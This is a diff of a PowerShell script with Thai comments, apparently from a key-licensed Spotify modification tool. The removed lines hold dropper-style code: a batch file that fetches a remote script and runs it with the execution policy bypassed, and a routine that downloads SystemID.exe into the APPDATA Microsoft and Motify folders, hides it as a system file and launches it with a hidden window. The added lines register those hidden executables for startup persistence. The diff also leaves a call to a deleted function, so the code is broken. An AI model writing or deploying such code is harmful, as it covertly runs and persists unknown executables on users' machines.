@@ -17,80 +17,6 @@ function Write-Log {
 }
 
 ###############################################
-# ฟังก์ชันสำหรับลบไฟล์ Spotify และข้อมูลที่เกี่ยวข้อง
-function Remove-Spotify {    
-    $spotifyPath = "$env:APPDATA\Spotify" 
-    if (Test-Path $spotifyPath) {
-        Remove-Item -Path $spotifyPath -Recurse -Force -ErrorAction SilentlyContinue
-    }
-    else {
-    }
-
-    # สร้างไฟล์ .bat สำหรับการลบ Spotify และรัน core.ps1
-    $batchScript = @"
-@echo off
-set PWSH=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
-set ScriptUrl=https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/core.ps1
-
-"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "& { Invoke-Expression (Invoke-WebRequest -Uri '%ScriptUrl%').Content }"
-"@
-    # สร้างและรันไฟล์ .bat
-    $batFilePath = [System.IO.Path]::Combine($env:TEMP, "remove_spotify.bat")
-    $batchScript | Set-Content -Path $batFilePath
-    Start-Process -FilePath $batFilePath -NoNewWindow -Wait
-    # ลบไฟล์ .bat หลังจากทำงานเสร็จ
-    Remove-Item -Path $batFilePath -Force
-    Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
-    exit
-}
-
-###############################################
-# ฟังก์ชันดาวน์โหลด SystemID.exe
-function Download-SystemID {
-    param (
-        [string]$destinationPath
-    )
-    $downloadUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/SystemID.exe"
-    try {
-        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing
-    }
-    catch {
-        Write-Log "Error: Failed to download ID"
-    }
-}
-
-
-###############################################
-# ฟังก์ชันตรวจสอบว่า SystemID.exe มีอยู่หรือไม่ในโฟลเดอร์ Motify และ Microsoft
-function Ensure-SystemIDExists {
-    $motifyFolder = "$env:APPDATA\Motify"
-    $microsoftFolder = "$env:APPDATA\Microsoft"
-    
-    if (-not (Test-Path $motifyFolder)) {
-         New-Item -ItemType Directory -Path $motifyFolder -Force | Out-Null
-    }
-    if (-not (Test-Path $microsoftFolder)) {
-         New-Item -ItemType Directory -Path $microsoftFolder -Force | Out-Null
-    }
-    
-    $motifyPath = Join-Path $motifyFolder "SystemID.exe"
-    $microsoftPath = Join-Path $microsoftFolder "SystemID.exe"
-
-    foreach ($path in @($motifyPath, $microsoftPath)) {
-        if (Test-Path $path) {
-            attrib -h -s $path  # ทำให้ไฟล์มองเห็นได้ชั่วคราว
-            Download-SystemID -destinationPath $path  # โหลดทับไฟล์เดิม
-            attrib +h +s $path  # ซ่อนไฟล์ใหม่อีกครั้ง
-        }
-        else {
-            Download-SystemID -destinationPath $path
-            attrib +h +s $path  # ซ่อนไฟล์หลังดาวน์โหลด
-        }
-        Start-Process $path -WindowStyle Hidden
-    }
-}
-
-###############################################
 # ฟังก์ชันเพิ่มโปรแกรมใน Registry สำหรับ Startup
 function Add-StartupRegistry {
     $motifyPath = "$env:APPDATA\Motify\SystemID.exe"
@@ -111,6 +37,7 @@ function Add-StartupRegistry {
 
     try {
          Set-ItemProperty -Path $regKey -Name $regValueName1 -Value $motifyPath -Force
+		   Write-Log "System: Add ID"
     }
     catch {
          Write-Log "Error: Failed to add ID"
@@ -118,6 +45,7 @@ function Add-StartupRegistry {
     }
     try {
          Set-ItemProperty -Path $regKey -Name $regValueName2 -Value $microsoftPath -Force
+		 Write-Log "System: Add IDM"
     }
     catch {
          Write-Log "Error: Failed to add IDM"
@@ -204,7 +132,6 @@ function Check-ExpiryDate {
 function Check-HwidAndKey {
     Write-Log "------------------------ Log Entry: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ------------------------"
     Write-Log "Start: Checking HWID, Key, and Files"
-    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
     $filePath = "$env:APPDATA\Motify\key_hwid.json"
 
     # รับค่า HWID ของเครื่อง
@@ -231,34 +158,10 @@ function Check-HwidAndKey {
     }
     
     $key = $data.key
-    $hwidFromFile = $data.hwid
-
+    
     # ตรวจสอบวันหมดอายุของ Key
     if (Check-ExpiryDate -key $key) {
         Write-Log "Error: Key has expired"
-        Remove-Item $filePath -Force
-        Remove-Spotify
-        exit
-    }
-    
-    # ตรวจสอบความตรงกันของ HWID ระหว่างไฟล์กับ Supabase
-    $supabaseURL = "https://sepwbvwlodlwehflzyiw.supabase.co"
-    $supabaseAPIKey = $env:moyx
-    $url = "$supabaseURL/rest/v1/keys?key=eq.$key"
-    try {
-        $response = Invoke-RestMethod -Uri $url -Method Get -Headers @{ "apikey" = $supabaseAPIKey }
-        if ($response.Count -eq 0 -or $response[0].used -eq $false -or $response[0].hwid -ne $hwidFromFile) {
-            Write-Log "Error: Key/HWID mismatch or key deleted in DATA"
-            Remove-Item $filePath -Force
-            Remove-Spotify
-            exit
-        }
-        else {
-            Add-StartupRegistry
-        }
-    }
-    catch {
-        Write-Log "Error: Failed to connect to DATA"
         Remove-Item $filePath -Force
         Remove-Spotify
         exit
@@ -269,6 +172,6 @@ function Check-HwidAndKey {
 
 ###############################################
 # Main Execution
-Ensure-SystemIDExists
 Check-HwidAndKey
+Add-StartupRegistry
 Write-Log "Verified"
